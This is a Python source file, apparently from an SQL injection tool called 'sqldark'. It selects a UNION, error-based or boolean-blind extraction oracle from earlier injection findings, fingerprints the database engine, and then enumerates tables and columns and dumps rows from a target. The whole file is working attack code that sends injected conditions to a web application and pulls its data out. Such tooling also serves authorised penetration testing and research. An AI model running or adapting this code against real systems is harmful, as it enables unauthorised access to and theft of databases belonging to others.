"""Build the right oracle from a finding and run requested enumeration."""
from sqldark.enumeration.extractor import UnionOracle, BlindOracle, ErrorOracle, Extractor, ERROR_LEAK
from sqldark.enumeration.dialects import DIALECTS
from sqldark.techniques import similarity

# Order to try when actively fingerprinting via the oracle.
FINGERPRINT_ORDER = ["MySQL", "PostgreSQL", "Microsoft SQL Server", "SQLite", "Oracle"]


def fingerprint_dbms(oracle, log):
    """Actively identify the DBMS by reading each dialect's version expr."""
    for dbms in FINGERPRINT_ORDER:
        expr = DIALECTS[dbms]["version"]
        # For a blind oracle, load this candidate's substr/ascii/length first.
        if hasattr(oracle, "set_dialect"):
            oracle.set_dialect(DIALECTS[dbms])
        try:
            val = oracle.read(expr, max_len=96) if "max_len" in oracle.read.__code__.co_varnames else oracle.read(expr)
        except Exception:
            val = None
        if val:
            log.ok(f"DBMS fingerprinted via oracle: {dbms} ({val})")
            return dbms, val
    return None, None


def _boolean_truth(http, point, baseline, detail):
    prefix, suffix = detail["prefix"], detail["suffix"]
    def truth(cond):
        payload = f"{prefix} AND ({cond}){suffix}"
        payload = http._tamper(payload)
        url, data = point.build(payload)
        r = http.send(url, method=point.method, data=data)
        return similarity(r.text, baseline.text) >= 0.95
    return truth


def build_oracle(http, log, findings, baseline):
    """Prefer UNION (direct, 1 req/value); fall back to boolean blind."""
    union = next((f for f in findings if f.technique == "UNION query"), None)
    if union:
        log.info("using UNION oracle for extraction")
        return UnionOracle(http, union.point, union.detail, log), (union.dbms or "MySQL")
    err = next((f for f in findings if f.technique == "error-based"
                and (f.dbms in ERROR_LEAK)), None)
    if err:
        log.info(f"using error-based oracle for extraction ({err.dbms})")
        detail = err.detail or {}
        pre = detail.get("prefix", "'")
        suf = detail.get("suffix", "-- -")
        o = ErrorOracle(http, err.point, err.dbms, pre, suf, log)
        if o.available():
            return o, err.dbms
    boolean = next((f for f in findings if "boolean" in f.technique), None)
    if boolean:
        log.info("using boolean-blind oracle for extraction")
        truth = _boolean_truth(http, boolean.point, baseline, boolean.detail)
        return BlindOracle(http, boolean.point, truth, log), (boolean.dbms or "MySQL")
    return None, None


def run_enumeration(http, log, findings, baseline, opts):
    oracle, dbms = build_oracle(http, log, findings, baseline)
    if not oracle:
        log.warn("no oracle-capable vector (need UNION or boolean) for extraction")
        return
    # Prefer a DBMS a technique already named; otherwise fingerprint actively.
    named = next((f.dbms for f in findings if f.dbms), None)
    if named:
        dbms = named
    if not dbms or dbms == "MySQL":
        fp, _ = fingerprint_dbms(oracle, log)
        if fp:
            dbms = fp
    from sqldark.enumeration.dialects import get as _get_dialect
    if hasattr(oracle, 'set_dialect'):
        oracle.set_dialect(_get_dialect(dbms))
    ext = Extractor(oracle, dbms, log)
    log.info(f"extraction back-end: {dbms}")

    result = {"dbms": dbms, "banner": None, "current_db": None, "databases": {}}

    if opts.get("banner"):
        result["banner"] = ext.banner()
    cur_db = None
    if opts.get("current_db"):
        cur_db = ext.current_db()
        result["current_db"] = cur_db

    want_dump = opts.get("dump") or opts.get("dump_all")
    if opts.get("tables") or want_dump:
        db_label = opts.get("db") or cur_db or "database"
        tables = ext.tables(db=opts.get("db"))
        # --dump-all ignores -T and takes every table; otherwise honour -T.
        if opts.get("dump_all") or not opts.get("table"):
            target_tables = tables
        else:
            target_tables = [opts["table"]]
        dbnode = result["databases"].setdefault(db_label, {})
        if opts.get("columns") or want_dump:
            for t in target_tables:
                cols = ext.columns(t, db=opts.get("db"))
                node = dbnode.setdefault(t, {"columns": cols, "rows": []})
                node["columns"] = cols
                if want_dump and cols:
                    rows = ext.dump(t, cols, max_rows=opts.get("max_rows", 50))
                    node["rows"] = rows
        else:
            for t in target_tables:
                dbnode.setdefault(t, {"columns": [], "rows": []})
    return result
